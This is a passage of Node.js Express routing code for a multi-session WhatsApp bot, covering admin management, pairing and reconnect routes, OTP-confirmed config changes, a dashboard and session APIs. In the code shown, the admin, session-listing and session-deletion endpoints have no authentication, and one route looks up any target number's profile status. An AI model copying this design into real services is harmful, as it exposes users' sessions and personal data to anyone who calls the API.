  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// admin endpoints

router.post('/admin/add', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await addAdminToMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/admin/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeAdminFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/admin/list', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.status(200).send({ status: 'ok', admins: list });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// existing endpoints (connect, reconnect, active, etc.)

router.get('/', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send({ error: 'Number parameter is required' });
  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
  await EmpirePair(number, res);
});


router.get('/active', (req, res) => {
  res.status(200).send({ botName: BOT_NAME_FANCY, count: activeSockets.size, numbers: Array.from(activeSockets.keys()), timestamp: getHaitiTimestamp() });
});


router.get('/ping', (req, res) => {
  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, message: 'Doberto XD', activesession: activeSockets.size });
});


router.get('/connect-all', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found to connect' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      await EmpirePair(number, mockRes);
      results.push({ number, status: 'connection_initiated' });
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Connect all error:', error); res.status(500).send({ error: 'Failed to connect all bots' }); }
});


router.get('/reconnect', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No session numbers found in MongoDB' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      try { await EmpirePair(number, mockRes); results.push({ number, status: 'connection_initiated' }); } catch (err) { results.push({ number, status: 'failed', error: err.message }); }
      await delay(1000);
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Reconnect error:', error); res.status(500).send({ error: 'Failed to reconnect bots' }); }
});


router.get('/update-config', async (req, res) => {
  const { number, config: configString } = req.query;
  if (!number || !configString) return res.status(400).send({ error: 'Number and config are required' });
  let newConfig;
  try { newConfig = JSON.parse(configString); } catch (error) { return res.status(400).send({ error: 'Invalid config format' }); }
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const otp = generateOTP();
  otpStore.set(sanitizedNumber, { otp, expiry: Date.now() + config.OTP_EXPIRY, newConfig });
  try { await sendOTP(socket, sanitizedNumber, otp); res.status(200).send({ status: 'otp_sent', message: 'OTP sent to your number' }); }
  catch (error) { otpStore.delete(sanitizedNumber); res.status(500).send({ error: 'Failed to send OTP' }); }
});


router.get('/verify-otp', async (req, res) => {
  const { number, otp } = req.query;
  if (!number || !otp) return res.status(400).send({ error: 'Number and OTP are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const storedData = otpStore.get(sanitizedNumber);
  if (!storedData) return res.status(400).send({ error: 'No OTP request found for this number' });
  if (Date.now() >= storedData.expiry) { otpStore.delete(sanitizedNumber); return res.status(400).send({ error: 'OTP has expired' }); }
  if (storedData.otp !== otp) return res.status(400).send({ error: 'Invalid OTP' });
  try {
    await setUserConfigInMongo(sanitizedNumber, storedData.newConfig);
    otpStore.delete(sanitizedNumber);
    const sock = activeSockets.get(sanitizedNumber);
    if (sock) await sock.sendMessage(jidNormalizedUser(sock.user.id), { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('📌 CONFIG UPDATED', 'Your configuration has been successfully updated!', BOT_NAME_FANCY) });
    res.status(200).send({ status: 'success', message: 'Config updated successfully' });
  } catch (error) { console.error('Failed to update config:', error); res.status(500).send({ error: 'Failed to update config' }); }
});


router.get('/getabout', async (req, res) => {
  const { number, target } = req.query;
  if (!number || !target) return res.status(400).send({ error: 'Number and target number are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const targetJid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
  try {
    const statusData = await socket.fetchStatus(targetJid);
    const aboutStatus = statusData.status || 'No status available';
    const setAt = statusData.setAt ? moment(statusData.setAt).tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss') : 'Unknown';
    res.status(200).send({ status: 'success', number: target, about: aboutStatus, setAt: setAt });
  } catch (error) { console.error(`Failed to fetch status for ${target}:`, error); res.status(500).send({ status: 'error', message: `Failed to fetch About status for ${target}.` }); }
});


// ---------------- Dashboard endpoints & static ----------------

const dashboardStaticDir = path.join(__dirname, 'dashboard_static');
if (!fs.existsSync(dashboardStaticDir)) fs.ensureDirSync(dashboardStaticDir);
router.use('/dashboard/static', express.static(dashboardStaticDir));
router.get('/dashboard', async (req, res) => {
  res.sendFile(path.join(dashboardStaticDir, 'index.html'));
});


// API: sessions & active & delete

router.get('/api/sessions', async (req, res) => {
  try {
    await initMongo();
    const docs = await sessionsCol.find({}, { projection: { number: 1, updatedAt: 1 } }).sort({ updatedAt: -1 }).toArray();
    res.json({ ok: true, sessions: docs });
  } catch (err) {
    console.error('API /api/sessions error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.get('/api/active', async (req, res) => {
  try {
    const keys = Array.from(activeSockets.keys());
    res.json({ ok: true, active: keys, count: keys.length });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.post('/api/session/delete', async (req, res) => {
  try {
    const { number } = req.body;
    if (!number) return res.status(400).json({ ok: false, error: 'number required' });
    const sanitized = ('' + number).replace(/[^0-9]/g, '');
    const running = activeSockets.get(sanitized);
    if (running) {
      try { if (typeof running.logout === 'function') await running.logout().catch(()=>{}); } catch(e){}
      try { running.ws?.close(); } catch(e){}
      activeSockets.delete(sanitized);
      socketCreationTime.delete(sanitized);
    }
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);
    try { const sessTmp = path.join(os.tmpdir(), `session_${sanitized}`); if (fs.existsSync(sessTmp)) fs.removeSync(sessTmp); } catch(e){}
    res.json({ ok: true, message: `Session ${sanitized} removed` });
  } catch (err) {
    console.error('API /api/session/delete error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.get('/api/newsletters', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.json({ ok: true, list });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});
router.get('/api/admins', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.json({ ok: true, list });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


// ---------------- cleanup + process events ----------------

process.on('exit', () => {
  activeSockets.forEach((socket, number) => {
    try { socket.ws.close(); } catch (e) {}
    activeSockets.delete(number);
    socketCreationTime.delete(number);
    try { fs.removeSync(path.join(os.tmpdir(), `session_${number}`)); } catch(e){}
  });
});


process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
  try { exec(`pm2.restart ${process.env.PM2_NAME || 'basebot-md'}`); } catch(e) { console.error('Failed to restart pm2:', e); }
});


// initialize mongo & auto-reconnect attempt

initMongo().catch(err => console.warn('Mongo init failed at startup', err));
(async()=>{ try { const nums = await getNumbersForServer(SERVER_ID); if (nums && nums.length) { for (const n of nums) { if (!activeSockets.has(n)) { const mockRes = { headersSent:false, send:()=>{}, status:()=>mockRes }; await EmpirePair(n, mockRes); await delay(500); } } } } catch(e){} })();

module.exports = router;
module.exports.activeSockets = activeSockets;
